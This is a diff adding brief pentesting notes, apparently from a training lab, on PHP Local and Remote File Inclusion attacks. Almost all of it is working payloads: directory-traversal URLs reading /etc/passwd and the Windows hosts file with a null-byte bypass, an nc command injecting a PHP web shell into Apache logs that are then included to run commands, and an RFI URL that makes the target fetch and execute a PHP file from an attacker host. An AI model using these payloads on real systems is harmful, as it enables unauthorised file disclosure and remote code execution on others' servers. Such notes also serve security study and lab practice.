@@ -1,0 +1,34 @@
+Check the headers of the request/response
+
+LFI
+===
+
+# LANG is included
+url.php?name=Tyler&LANG=../../../../../../../../../../../windows/system32/drivers/etc/hosts
+url.php?name=Tyler&LANG=../../../../../../../../../../../etc/passwd
+
+# In versions of PHP below 5.3, we would be able to terminate our request with a null
+# byte (%00) that would cause the PHP engine to ignore everything after that byte. Using
+# this trick, in our example, seems to work. Once the .php extension is removed from our
+# request, the PHP engine includes the specified file.
+url.php?name=Tyler&LANG=../../../../../../../../../../../windows/system32/drivers/etc/hosts%00
+url.php?name=Tyler&LANG=../../../../../../../../../../../etc/passwd%00
+
+HOW-TO
+# Contaminate logs
+    nc -nv 10.11.1.35 80
+    <?php echo shell_exec($_GET['cmd']);?>
+
+    HTTP/1.1 400 Bad Request
+
+url.php?name=a&cmd=ipconfig&LANG=../../../../../../../xampp/apache/logs/access.log%00
+url.php?name=a&cmd=ipconfig&LANG=../../../../../../../var/log/apache/logs/access.log%00
+
+RFI
+===
+
+/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.5/evil.txt%00
+
+root@kali:/var/www/html# cat evil.txt
+<?php echo shell_exec("ipconfig");?>
+root@kali:/var/www/html# systemctl start apache2
